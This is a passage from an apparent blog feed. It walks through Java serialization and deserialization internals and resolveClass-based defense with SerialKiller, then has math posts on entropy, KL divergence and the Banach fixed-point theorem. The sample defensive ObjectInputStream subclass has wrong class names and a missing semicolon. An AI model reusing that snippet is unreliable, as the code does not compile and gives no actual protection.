2:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 9 - 0x00 09</span><br><span class="line">            Value - firstname - 0x66697273746e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">        3:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 8 - 0x00 08</span><br><span class="line">            Value - lastname - 0x6c6173746e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_REFERENCE - 0x71</span><br><span class="line">              Handle - 8257537 - 0x00 7e 00 01</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      User</span><br><span class="line">        values</span><br><span class="line">          age</span><br><span class="line">            (int)20 - 0x00 00 00 14</span><br><span class="line">          money</span><br><span class="line">            (int)100 - 0x00 00 00 64</span><br><span class="line">          firstname</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 6 - 0x00 06</span><br><span class="line">                Value - cl0und - 0x636c30756e64</span><br><span class="line">          lastname</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 04</span><br><span class="line">                Length - 5 - 0x00 05</span><br><span class="line">                Value - lisan - 0x6c6973616e</span><br></pre></td></tr></table></figure>
<p>可以看到在序列化的时候世界上是写入了各字段长度的，所以在后面反序列化读的时候是按照字段长度来进行读取的。<strong>这也解释了为什么在反序列化数据后面插入脏数据会不会影响反序列化</strong>。</p>
<h2 id="反序列化">反序列化</h2>
<h3 id="预处理-2">预处理</h3>
<p>反序列化和序列化互为称操作，其主要的操作在readObject0里面<br>
<img src="1579081394980-e507b22c-1658-4b07-b841-ba11924dcecb.png#align=left&amp;display=inline&amp;height=217&amp;name=image.png&amp;originHeight=434&amp;originWidth=1926&amp;size=114185&amp;status=done&amp;style=none&amp;width=963" alt="image.png"></p>
<p>case到object进行反序列化，整个object的反序化在readOrdinaryObject中<br>
<img src="1579081417550-f6a84856-864a-4e96-bbb9-f92cfffeffa2.png#align=left&amp;display=inline&amp;height=62&amp;name=image.png&amp;originHeight=100&amp;originWidth=1202&amp;size=18103&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>和序列化对称还是分两步，第一步是读取出类的元信息（readClassDesc），第二步是读取出对象属性具体的数据（readSerialData）。<br>
<img src="1579097989089-bb47e454-4a63-4f1f-adba-b23a19fddfdf.png#align=left&amp;display=inline&amp;height=657&amp;name=image.png&amp;originHeight=1314&amp;originWidth=2282&amp;size=361847&amp;status=done&amp;style=none&amp;width=1141" alt="image.png"></p>
<h3 id="反序列化数据">反序列化数据</h3>
<h4 id="readClassDesc">readClassDesc</h4>
<p>在序列化那里提到过，对把类类型分成四个类型处理，这里的User是非代理普通类，就走readNonProxyDesc。<br>
<img src="1579098107741-afcde48d-8a7a-4d1f-83be-c826002ecee5.png#align=left&amp;display=inline&amp;height=525&amp;name=image.png&amp;originHeight=1050&amp;originWidth=2250&amp;size=280701&amp;status=done&amp;style=none&amp;width=1125" alt="image.png"></p>
<p>readNonProxyDesc中主要的操作在readClassDescriptor、resolveClass、initNonProxy（<strong>注意这里initNonProxy的最后一个传参，这里递归调用了readClassDesc</strong>）。<br>
<img src="1579098941907-9785fe5c-79de-442c-9632-f8366c6f50bc.png#align=left&amp;display=inline&amp;height=762&amp;name=image.png&amp;originHeight=1524&amp;originWidth=2322&amp;size=485982&amp;status=done&amp;style=none&amp;width=1161" alt="image.png"></p>
<p>readClassDescriptor读出了类的元数据并把每一个属性名抽象成了ObjectStreamField类<br>
<img src="1579098457484-d2b7c5d1-7498-4b1b-84fb-4697e163e69c.png#align=left&amp;display=inline&amp;height=744&amp;name=image.png&amp;originHeight=1488&amp;originWidth=2144&amp;size=459960&amp;status=done&amp;style=none&amp;width=1072" alt="image.png"></p>
<p>resolveClass对类类型进行了构建，注意这里第二参数为false，意味着并不会执行类的初始化（static代码块不执行）<br>
。</p>
<p><img src="1579098865240-c1eebc8c-097a-4c4b-a621-fa41f37583a1.png#align=left&amp;display=inline&amp;height=293&amp;name=image.png&amp;originHeight=586&amp;originWidth=2098&amp;size=135558&amp;status=done&amp;style=none&amp;width=1049" alt="image.png"></p>
<p><strong>另外注意这里解释了为什么设置反序列化防御的点是在resolveClass，如果想对反序列化设置防御，就需要自己实现一个ObjectInputStream。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyObjInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObjInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjInputStream desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;defence&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>initNonProxy又构建了类的元信息。<br>
<img src="1579099519793-d21fcdc2-bccf-411c-bef1-5e517f4e508f.png#align=left&amp;display=inline&amp;height=474&amp;name=image.png&amp;originHeight=948&amp;originWidth=1518&amp;size=180999&amp;status=done&amp;style=none&amp;width=759" alt="image.png"></p>
<p>最后desc（ObjectStreamClass）传出给外层readOrdinaryObject。首先会进行对象的初始化，然后读出数据注入类中。<br>
<img src="1579099650702-8f1fa375-96f9-4d7e-86e2-f6e25abf5621.png#align=left&amp;display=inline&amp;height=355&amp;name=image.png&amp;originHeight=710&amp;originWidth=1720&amp;size=154285&amp;status=done&amp;style=none&amp;width=860" alt="image.png"></p>
<h4 id="readSerialData">readSerialData</h4>
<p>如果我们自定义了readObject方法，那么这里就会invoke，<strong>这里解释了为什么就java反序列化使用而言是反序列化类的readObject开始。</strong><br>
<img src="1579101128866-30f3281e-d43c-4033-aa18-e81302113c73.png#align=left&amp;display=inline&amp;height=435&amp;name=image.png&amp;originHeight=870&amp;originWidth=2158&amp;size=270819&amp;status=done&amp;style=none&amp;width=1079" alt="image.png"></p>
<p>但是在User类中在我们并没有自定义反序列化方法随意还是走默认路线。<br>
<img src="1579099806423-394e2869-54a0-41a1-ab91-84de80fde8de.png#align=left&amp;display=inline&amp;height=548&amp;name=image.png&amp;originHeight=1096&amp;originWidth=2446&amp;size=295874&amp;status=done&amp;style=none&amp;width=1223" alt="image.png"></p>
<p>defaultReadFields，中第一个循环把原生类型数据赋给obj，第二个循环把数组、枚举类型、对象类型赋给obj。<br>
<img src="1579099910627-5e87fc03-44b5-4eca-a2e2-3d75b83f0fd8.png#align=left&amp;display=inline&amp;height=632&amp;name=image.png&amp;originHeight=1264&amp;originWidth=2000&amp;size=336960&amp;status=done&amp;style=none&amp;width=1000" alt="image.png"></p>
<p>补充一张整个反序列化的时序图。<br>
<img src="1579141111812-93300e7b-b9e9-4e5c-a4d7-640bb1a38793.png#align=left&amp;display=inline&amp;height=801&amp;name=image.png&amp;originHeight=1602&amp;originWidth=2582&amp;size=1407262&amp;status=done&amp;style=none&amp;width=1291" alt="image.png"></p>
<h2 id="从SerialKiller来java反序列化防御">从SerialKiller来java反序列化防御</h2>
<p><a href="https://github.com/ikkisoft/SerialKiller">https://github.com/ikkisoft/SerialKiller</a><br>
原生使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(is);</span><br><span class="line"><span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> (String) ois.readObject();</span><br></pre></td></tr></table></figure>
<p>加上SerialKiller后的使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(is, <span class="string">&quot;/etc/serialkiller.conf&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> (String) ois.readObject();</span><br></pre></td></tr></table></figure>
<p>可以看到它的原理就是上面提的自己实现流并且在resolveClass处加上白名单或者黑名单的过滤。<br>
<img src="1581650629068-43309a6e-425b-40e0-a375-61538f1648db.png#align=left&amp;display=inline&amp;height=786&amp;name=image.png&amp;originHeight=1572&amp;originWidth=2024&amp;size=259760&amp;status=done&amp;style=none&amp;width=1012" alt="image.png"></p>
<h2 id="杂">杂</h2>
<p>当父子接口同时实现了Serializable接口时</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserBase</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    UserBase()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;UserBase无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UserBase(<span class="type">int</span> age)&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;UserBase有参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User2</span> <span class="keyword">extends</span> <span class="title class_">UserBase</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line"></span><br><span class="line">    User2()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User2无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    User2(<span class="type">int</span> age)&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;User2有参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>控制台输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UserBase无参构造</span><br><span class="line">User2有参构造</span><br><span class="line">-----------------</span><br><span class="line">2333</span><br></pre></td></tr></table></figure>
<p>当只有子类实现Serializable接口父类没有实现时。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerialAndUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oops</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./serializable.txt&quot;</span>));</span><br><span class="line">        oops.writeObject(<span class="keyword">new</span> <span class="title class_">User2</span>(<span class="number">2333</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oips</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./serializable.txt&quot;</span>));</span><br><span class="line">        <span class="type">User2</span> <span class="variable">user</span> <span class="operator">=</span> (User2) oips.readObject();</span><br><span class="line"></span><br><span class="line">        System.out.println(user.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserBase</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    UserBase()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;UserBase无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UserBase(<span class="type">int</span> age)&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;UserBase有参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User2</span> <span class="keyword">extends</span> <span class="title class_">UserBase</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line"></span><br><span class="line">    User2()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User2无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    User2(<span class="type">int</span> age)&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;User2有参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UserBase无参构造</span><br><span class="line">User2有参构造</span><br><span class="line">-----------------</span><br><span class="line">UserBase无参构造</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<h2 id="总结及一些tip">总结及一些tip</h2>
<ul>
<li>序列化时，当写入类的元数据的时候，是先写子类的类元数据，然后递归调用的写入父类的类元数据（只有实现序列化接口的才会有类元数据）。</li>
<li>防御反序列化的原理是在resolveClass处设防而不是readResolve</li>
<li>在序列化数据末尾加入脏数据不会影响正常的反序列化。</li>
</ul>
<h2 id="参考">参考</h2>
<p><a href="https://blog.csdn.net/qq_36744284/article/details/89604011">java中的序列化与反序列化及其源码分析（特别详细）</a><br>
<a href="http://xxlegend.com/2018/06/20/%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB/">先知大会议题Java反序列化实战</a><br>
[从WebLogic看反序列化漏洞的利用与防御](</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>ML的信息论基石-kraft不等式，信息熵，KL散度</title>
    <url>/2025/05/03/ML%E7%9A%84%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%9F%B3-kraft%E4%B8%8D%E7%AD%89%E5%BC%8F%EF%BC%8C%E4%BF%A1%E6%81%AF%E7%86%B5%EF%BC%8CKL%E6%95%A3%E5%BA%A6/</url>
    <content><![CDATA[<p>注：<strong>请多刷新一次前端，以便让数学公式正确渲染。</strong></p>
<h2 id="一、基本名词与概念"><a href="#一、基本名词与概念" class="headerlink" title="一、基本名词与概念"></a>一、基本名词与概念</h2><h3 id="1-前缀码与前缀自由码"><a href="#1-前缀码与前缀自由码" class="headerlink" title="1. 前缀码与前缀自由码"></a>1. 前缀码与前缀自由码</h3><ul>
<li><strong>前缀码</strong>：没有一个码字是另一个码字的前缀。例如霍夫曼码。  </li>
<li><strong>重要性</strong>：前缀码满足即时唯一可译性（译码时不会二义并且即时解码AA）。</li>
</ul>
<hr>
<h3 id="2-Kraft不等式"><a href="#2-Kraft不等式" class="headerlink" title="2. Kraft不等式"></a>2. Kraft不等式</h3><p>Kraft不等式是信息论中关于前缀编码（或者说前缀码树/二叉树）的一个重要结论。它说明任意一组前缀码的码长 $ l_1, l_2, \ldots, l_n $ 必须满足</p>
<p>$ \sum_{i=1}^n 2^{-l_i} \leq 1 $</p>
<p>反之，只有满足这个不等式才有可能存在对应的前缀码。</p>
<h4 id="Kraft不等式证明"><a href="#Kraft不等式证明" class="headerlink" title="Kraft不等式证明"></a>Kraft不等式证明</h4><p><strong>必要性（任何前缀码的一组码长都满足Kraft不等式）：</strong>  </p>
<p>设$ D $为二叉树，每个码字可表示为树的一条路径。  </p>
<ul>
<li>码长为 $ l_k $ 的码字在树的第 $ l_k $ 层，是一个叶子。  </li>
<li>每一层最多有 $ 2^{l_k} $ 个节点，叶子节点互不重叠。  </li>
<li>所有码字实际占用的叶子数之和</li>
</ul>
<p>$ \sum_{i=1}^n 2^{L-l_i} $</p>
<p>  其中 $ L $ 为所有码长的最大值。  </p>
<ul>
<li>总叶子数为 $ 2^L $  </li>
<li>所以有：$ \sum_{i=1}^n 2^{L-l_i} \leq 2^L \implies \sum_{i=1}^n 2^{-l_i} \leq 1 $</li>
</ul>
<p><em>补充：什么叫码字实际占用的叶子数之和？</em></p>
<p>_假设我们最大码长是 _$ L $_，再看一个码字长度是 _$ l $<em>。</em></p>
<ul>
<li><em>一个长度为 <em>$ l $</em> 的码字，从根到它走了 <em>$ l $</em> 步。</em></li>
<li>_如果继续从它往下走，走满长度 _$ L $<em>，还能走 <em>$ (L-l) $</em> 步。</em></li>
<li><em>每多一步可分岔两路，</em>$ (L-l) $_ 步一共可以分成 <em>$ 2^{L-l} $</em> 个不同的终点（叶子）。_</li>
<li><em>所以长度为 <em>$ l $</em> 的码字，等价于在最大深度 <em>$ L $</em> 处“占用”了 <em>$ 2^{L-l} $</em> 个叶子。</em></li>
</ul>
<p><strong>充分性（只要码长满足Kraft不等式，就能构造前缀码）：</strong>  </p>
<ul>
<li>将所有 $ l_i $ 从小到大排序。  </li>
<li>从编码树顶部出发，依次分配以 $ l_i $ 为长度的唯一路径（即叶子结点）；因Kraft不等式成立，子树不会重叠，必能分配完全部码字且不会出现有一个码字是其他码字前缀的情况。  </li>
<li>具体可采用“字典树”方式依次分配。</li>
</ul>
<hr>
<h3 id="3-信息熵（Shannon-Entropy）"><a href="#3-信息熵（Shannon-Entropy）" class="headerlink" title="3. 信息熵（Shannon Entropy）"></a>3. 信息熵（Shannon Entropy）</h3><p>对离散信源$ X $（概率分布为 $ {p_1, p_2, …, p_n} $）：  </p>
<ul>
<li>$ H(X) = -\sum_{i=1}^n p_i \log_2 p_i $</li>
<li>这个数是用拉个朗日乘数法得到的，可以参考下面 “最优编码定理”。</li>
<li>熵是<strong>最优平均编码长度的下界</strong>。</li>
</ul>
<hr>
<h3 id="4-最优编码定理"><a href="#4-最优编码定理" class="headerlink" title="4. 最优编码定理"></a>4. 最优编码定理</h3><p>这里摘要这个视频里面的证明：<a href="https://www.bilibili.com/video/BV1sV411k7qc/">https://www.bilibili.com/video/BV1sV411k7qc/</a><br>平均码长的最小值为熵或近似熵（$ \lceil l_i \rceil $ 情况下高于熵但不会超过1bit）：</p>
<ul>
<li>$ H(X) \leq L^* &lt; H(X) + 1 $</li>
</ul>
<p>假设我们要对一个文章中的字母用前缀码进行编码，那么如何让整个文章的编码最短的问题就转换为使得下图的中的E(L)变得最小。<br><img src="image2.png"><br>目标函数有了，优化的约束就是Kraft不等式（满足前缀码的充要条件）。<br><img src="image3.png"><br>这里选择用拉格朗日乘数法来求解，但是拉格朗日乘数法只适合解等式不能解不等式。所以先考虑等式的情况。<br><img src="image4.png"><br><img src="image5.png"></p>
<p>$l_i = - \log_2 p_i$，这里的$l_i$就是每个字母对应的码长了。因为码长不能是小数，所以要进行上取整。</p>
<p><img src="image.png"></p>
<ul>
<li>相关推导正是“在Kraft约束下极小化码长”——见“熵的最优性推导”小节。</li>
</ul>
<hr>
<h3 id="5-交叉熵与KL散度"><a href="#5-交叉熵与KL散度" class="headerlink" title="5. 交叉熵与KL散度"></a>5. 交叉熵与KL散度</h3><ul>
<li><strong>交叉熵</strong> $ H(P, Q) $：用$ Q $分布编码真实分布$ P $的信息平均长度：</li>
</ul>
<p>$ H(P, Q) = -\sum_x p(x) \log q(x) $</p>
<ul>
<li><strong>KL散度</strong>（相对熵）：</li>
</ul>
<p>$ D_{KL}(P | Q) = \sum_x p(x) \log \frac{p(x)}{q(x)} = H(P, Q) - H(P) $</p>
<ul>
<li>表示用$ Q $代替$ P $时的“额外码长”。</li>
</ul>
<hr>
<h2 id="二、各部分逻辑关系"><a href="#二、各部分逻辑关系" class="headerlink" title="二、各部分逻辑关系"></a>二、各部分逻辑关系</h2><ol>
<li><strong>Kraft不等式</strong> —— 判断前缀码能否存在及如何分配码长；  </li>
<li><strong>最优编码定理</strong> —— 满足Kraft不等式的最优平均编码长度的理论极限；  </li>
<li><strong>信息熵</strong> —— 度量信源不确定性，也限制度量最优编码效率；  </li>
<li><strong>交叉熵/相对熵 (KL散度)</strong> —— 两个概率分布编码效率的度量，机器学习损失函数常用。</li>
</ol>
<hr>
<h3 id="简要表格"><a href="#简要表格" class="headerlink" title="简要表格"></a>简要表格</h3><table>
<thead>
<tr>
<th>概念</th>
<th>数学表达</th>
<th>目的/意义</th>
</tr>
</thead>
<tbody><tr>
<td>Kraft不等式</td>
<td>$ \sum 2^{-l_i} \leq 1 $</td>
<td>判断能否分配码长形成前缀码</td>
</tr>
<tr>
<td>信息熵</td>
<td>$ H(X) = -\sum p_i \log_2 p_i $</td>
<td>不确定性度量、最优平均码长下界</td>
</tr>
<tr>
<td>最优编码定理</td>
<td>$ H(X) \leq L^* &lt; H(X)+1 $</td>
<td>连接实际编码与熵的极限</td>
</tr>
<tr>
<td>交叉熵</td>
<td>$ H(P, Q) = -\sum p(x)\log q(x) $</td>
<td>“用Q表示P”的平均信息长度</td>
</tr>
<tr>
<td>KL散度</td>
<td>$D_{KL}(P|Q)=\sum p(x)\log\frac{p(x)}{q(x)}$</td>
<td>Q相对P的“额外消耗”，度量分布差异</td>
</tr>
</tbody></table>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.bilibili.com/video/BV1sV411k7qc/">https://www.bilibili.com/video/BV1sV411k7qc/</a></p>
]]></content>
      <tags>
        <tag>ML</tag>
        <tag>Information theory</tag>
      </tags>
  </entry>
  <entry>
    <title>ML的数学基石-逆函数定理（Inverse function theorem）</title>
    <url>/2025/03/05/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E5%8F%8D%E5%87%BD%E6%95%B0%E5%AE%9A%E7%90%86%EF%BC%88Inverse-function-theorem%EF%BC%89/</url>
    <content><![CDATA[<p>注：<strong>请多刷新一次前端，以便让数学公式正确渲染。</strong></p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h3 id="单射，满射，双射"><a href="#单射，满射，双射" class="headerlink" title="单射，满射，双射"></a>单射，满射，双射</h3><ul>
<li><strong>单射</strong>：每个输入值有唯一的输出值，不会有两个不同的输入映射到同一个输出。</li>
<li><strong>满射</strong>：每个输出值都至少有一个输入值与之对应。</li>
<li><strong>双射</strong>：既是单射又是满射，即每个输入值有唯一的输出值，且每个输出值都有唯一的输入值。</li>
</ul>
<h3 id="雅可比矩阵-Jacobian-Matrix"><a href="#雅可比矩阵-Jacobian-Matrix" class="headerlink" title="雅可比矩阵 (Jacobian Matrix)"></a>雅可比矩阵 (Jacobian Matrix)</h3><p>雅可比矩阵是描述多元函数在某一点处的局部线性近似的矩阵形式，具体定义见前文。</p>
<hr>
<h1 id="预备知识-完备度量空间"><a href="#预备知识-完备度量空间" class="headerlink" title="预备知识 - 完备度量空间"></a>预备知识 - 完备度量空间</h1><h3 id="1-1-度量空间的基本定义"><a href="#1-1-度量空间的基本定义" class="headerlink" title="1.1 度量空间的基本定义"></a>1.1 度量空间的基本定义</h3><p>一个<strong>度量空间</strong>是一个集合 $S$ 配备了一个“度量函数” $d: S \times S \to \mathbb{R}$，它满足以下性质（即定义“距离”的规则）：</p>
<ol>
<li><strong>非负性</strong>：<br>$$<br>d(x, y) \geq 0, \quad \text{且当且仅当 } x = y, \ d(x, y) = 0;<br>$$</li>
<li><strong>对称性</strong>：<br>$$<br>d(x, y) = d(y, x);<br>$$</li>
<li><strong>三角不等式</strong>：对任意 $x, y, z \in S$，有<br>$$<br>d(x, z) \leq d(x, y) + d(y, z).<br>$$<br>度量 $d(x, y)$ 定义了集合 $S$ 中任意两点之间的距离，使 $S$ 成为一个度量空间。</li>
</ol>
<hr>
<h3 id="1-2-完备性：柯西序列的收敛性"><a href="#1-2-完备性：柯西序列的收敛性" class="headerlink" title="1.2 完备性：柯西序列的收敛性"></a>1.2 完备性：柯西序列的收敛性</h3><p>一个度量空间 $(S, d)$ 是<strong>完备的</strong>，当且仅当空间内的每个<strong>柯西序列</strong>都收敛于 $S$ 中的一个点。</p>
<h4 id="什么是柯西序列？"><a href="#什么是柯西序列？" class="headerlink" title="什么是柯西序列？"></a>什么是柯西序列？</h4><p>一个序列 ${x_n} \subseteq S$ 是一个<strong>柯西序列</strong>，如果它满足以下条件：</p>
<ul>
<li>对于任意的 $\varepsilon &gt; 0$，存在一个整数 $N &gt; 0$，使得当 $m, n \geq N$ 时，$$d(x_m, x_n) &lt; \varepsilon.$$</li>
</ul>
<p>简单来说，在柯西序列中，序列的元素在这个空间中变得越来越“接近彼此”。例如：</p>
<ul>
<li>如果序列越来越“集中”到一个点附近，就是柯西序列（无论这个点是否是空间内部的点）。</li>
<li>注意：柯西序列的定义不要求你事先知道收敛点，仅要求元素之间的距离无限趋近于零。</li>
</ul>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><ul>
<li><strong>正例</strong>：序列 $x_n = 1 + \frac{1}{n}$ 是一个柯西序列。</li>
<li><strong>反例</strong>：对于非完备的空间（例如 $\mathbb{Q}$ 上），可能存在柯西序列无法收敛到 $\mathbb{Q}$ 内的一个点。例如，序列 $x_n = 1, 1.4, 1.414, 1.4142, \dots$ 收敛到 $\sqrt{2}$，但 $\sqrt{2} \notin \mathbb{Q}$。这说明 $\mathbb{Q}$ 不完备。</li>
</ul>
<hr>
<h3 id="1-3-完备性的意义"><a href="#1-3-完备性的意义" class="headerlink" title="1.3 完备性的意义"></a>1.3 完备性的意义</h3><ul>
<li>在一个<strong>完备度量空间</strong>中，任何柯西序列一定会收敛，并且其极限点一定在空间 $S$ 内。</li>
<li>如果一个空间不是完备的，则可能存在柯西序列，其极限点落在 $S$ 外部（即序列离开了原来的空间）。</li>
</ul>
<hr>
<h1 id="预备知识-Banach-不动点定理"><a href="#预备知识-Banach-不动点定理" class="headerlink" title="预备知识 - Banach 不动点定理"></a>预备知识 - Banach 不动点定理</h1><h3 id="定理陈述"><a href="#定理陈述" class="headerlink" title="定理陈述"></a>定理陈述</h3><p>设 $(X, d)$ 是一个完备度量空间，$T: X \to X$ 是一个<strong>压缩映射</strong>，即存在常数 $0 \leq k &lt; 1$，使得对于任意 $x, y \in X$，有：<br>$$<br>d(T(x), T(y)) \leq k \cdot d(x, y).<br>$$<br>那么，$T$ 在 $X$ 中存在唯一的不动点 $x^*$，即 $T(x^*)=x^*$。</p>
<hr>
<h3 id="符号解释"><a href="#符号解释" class="headerlink" title="符号解释"></a>符号解释</h3><ol>
<li>$X$：一个集合，表示度量空间中的元素。</li>
<li>$d$：度量函数，表示 $X$ 中两个元素之间的距离，满足非负性、对称性和三角不等式。</li>
<li><strong>完备度量空间</strong>：度量空间 $(X, d)$ 是完备的，如果其中的所有柯西序列都收敛于 $X$ 中的某个点。</li>
<li>$T$：映射（函数），将 $X$ 中的元素映射到 $X$ 中的另一个元素。</li>
<li><strong>压缩映射</strong>：映射 $T$ 是压缩的，如果存在常数 $0 \leq k &lt; 1$，使得 $T$ 将任意两点之间的距离缩小至少 $k$ 倍。</li>
<li><strong>不动点</strong>：点 $x^*$ 是 $T$ 的不动点，如果 $T(x^*) = x^*$。</li>
</ol>
<hr>
<h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><h4 id="1-构造序列："><a href="#1-构造序列：" class="headerlink" title="1. 构造序列："></a>1. 构造序列：</h4><p>从任意一点 $x_0 \in X$ 开始，构造序列 ${x_n}$，其中：<br>$$<br>x_{n+1} = T(x_n),<br>$$<br>即每次将当前点通过映射 $T$ 映射到下一个点。</p>
<h4 id="2-证明序列是柯西序列："><a href="#2-证明序列是柯西序列：" class="headerlink" title="2. 证明序列是柯西序列："></a>2. 证明序列是柯西序列：</h4><p>对于任意 $n, m \in \mathbb{N}$（假设 $n &gt; m$），有：<br>$$<br>d(x_n, x_m) \leq d(x_n, x_{n-1}) + d(x_{n-1}, x_{n-2}) + \dots + d(x_{m+1}, x_m).<br>$$<br>由于 $T$ 是压缩映射，有：<br>$$<br>d(x_{i+1}, x_i) = d(T(x_i), T(x_{i-1})) \leq k \cdot d(x_i, x_{i-1}).<br>$$<br>递推可得：<br>$$<br>d(x_{i+1}, x_i) \leq k^i \cdot d(x_1, x_0).<br>$$<br>由于 $0 \leq k &lt; 1$，最终 $d(x_n, x_m)$ 收敛到 0，故 ${x_n}$ 是柯西序列。</p>
<h4 id="3-完备性保证极限存在："><a href="#3-完备性保证极限存在：" class="headerlink" title="3. 完备性保证极限存在："></a>3. 完备性保证极限存在：</h4><p>因为 $X$ 是完备的，柯西序列 ${x_n}$ 收敛于某个点 $x^* \in X$。注意，定理条件中给出了 $T$ 是 $X$ 到 $X$ 的映射。</p>
